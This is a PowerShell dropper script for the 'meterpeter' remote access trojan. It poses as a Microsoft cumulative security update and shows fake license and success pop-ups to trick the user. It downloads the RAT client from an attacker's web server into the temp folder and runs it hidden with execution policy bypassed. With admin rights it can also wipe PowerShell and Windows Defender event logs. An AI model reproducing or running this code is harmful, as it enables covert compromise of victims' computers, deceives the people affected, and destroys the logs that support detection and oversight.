<#
.SYNOPSIS
   meterpeter v2.10.10 dropper

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: Invoke-WebRequest {native}
   Optional Dependencies: ps2exe.ps1 {auto-download}, wevtutil {native}
   PS cmdlet Dev version: v1.1.4

.DESCRIPTION
   This cmdlet downloads\executes meterpeter client.ps1 (rat) from attacker
   machine python (http.server) or apache2 webservers into target $Env:TMP
   directory then executes the client.ps1 in an child process. (background)

.NOTES
   The generated executable will accept the use of parameters.
   Administrator Privs are required to clean PS\Defender logs.

.Parameter OutFile
   The absolucte path where to upload payload (default: $Env:TMP\Update-KB4524147.ps1)

.Parameter CleanLogs
   Delete Powershell\Windows Defender eventvwr logs at exit? (default: false)

.Parameter MsgBox
   Make executable spawn Social-Engineering MessageBoxes? (default: True)

.EXAMPLE
   PS C:\> .\Update-KB4524147.exe
   Automatic exploitation (default settings)

.EXAMPLE
   PS C:\> .\Update-KB4524147.exe -cleanlogs True
   Automatic exploitation (default settings) and delete eventvwr logs.

.EXAMPLE
   PS C:\> .\Update-KB4524147.exe -outfile "$Env:USERPROFILE\Desktop\MyReNamedRat.ps1"
   Download meterpeter client.ps1 to -outfile 'dir', rename it and execute it in background.
   
.OUTPUTS
   This cmdlet uses Wscript.Shell ComObject to display msgbox(s)
#>


#CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$OutFile="$Env:TMP\Update-KB4524147.ps1",
   [string]$CleanLogs="False",
   [string]$MsgBox="True"
)


$Executed = $null
$ListOfEvents = $null
$ErrorActionPreference = "SilentlyContinue"
$host.UI.RawUI.WindowTitle = "Cumulative Security KB4524147 Update"
$UserSetTings = powershell (New-Object -ComObject Wscript.Shell).Popup("                                                Feature update                                                `n`nTHIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`n`n                            Install Cumulative Security KB4524147 Update?",6,"                            Cumulative Security KB4524147 Update",1+0)
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")

#Download meterpeter client.ps1 from http.server\apache2 webserver into %tmp% directory!
If($MsgBox -ieq "True"){iwr -Uri "http://CharlieBrown/Update-KB4524147.ps1" -OutFile "$OutFile" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null}
try{#Execute meterpeter client.ps1 in a child process (background)
   Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-exec bypass -File $OutFile"|Out-Null
}catch{$Executed = "False"}


If($MsgBox -ieq "True")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Spawn Social-Engineering MessageBoxes function!
   #>

   If($UserSetTings -Match '^(1|-1)$' -and $Executed -ne "False")
   {
      powershell (New-Object -ComObject Wscript.Shell).Popup("system successfully updated! - Version: 45.19041.964.0",5,"                         Cumulative Security KB4524147 Update",0+64)|Out-Null
   }
   ElseIf($UserSetTings -Match '^(1|-1)$' -and $Executed -eq "False")
   {
      powershell (New-Object -ComObject Wscript.Shell).Popup("fail to execute:`n'$OutFile'.`nCVE: https://www.cvedetails.com/cve/CVE-2019-0971",8,"                         Cumulative Security KB4524147 Update",0+16)|Out-Null
   }
   Else
   {
      powershell (New-Object -ComObject Wscript.Shell).Popup("KB4524147 - Cumulative update aborted ..`nThis update adresses Microsoft Team Foundation Server.`nDisclosure assigned to CVE-2019-0971 as critical update.`n'Please address this vulnerability as soon as possible'.",8,"                      Cumulative Security KB4524147 Update",0+48)|Out-Null
      Start-Process "https://www.cvedetails.com/cve/CVE-2019-0971/" # <- open 'cvedetails.com' website using default browser!
   }

}


If($CleanLogs -ieq "True" -and $IsClientAdmin -ieq "True")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Delete PS\Defender eventvwr logs at exit!

   .NOTES
      Remark: 'Manual usage optional parameter function'
      This function Deletes logs from 'Powershell' and 'WindowsDefender'
      eventvwr categories. If this dropper is executed with admin privs.
   #>
   
   #Build an list of PS\defender categories!
   $ListOfEvents = wevtutil el | Where-Object {
      $_ -iMatch '(Powershell|Defender/Operational)' -and $_ -iNotMatch '(/Admin)$'
   }
   
   #Loop trugth all categories to clean logs.
   ForEach($EventToDelete in $ListOfEvents)
   {
      wevtutil cl "$EventToDelete"|Out-Null
   }

}
exit

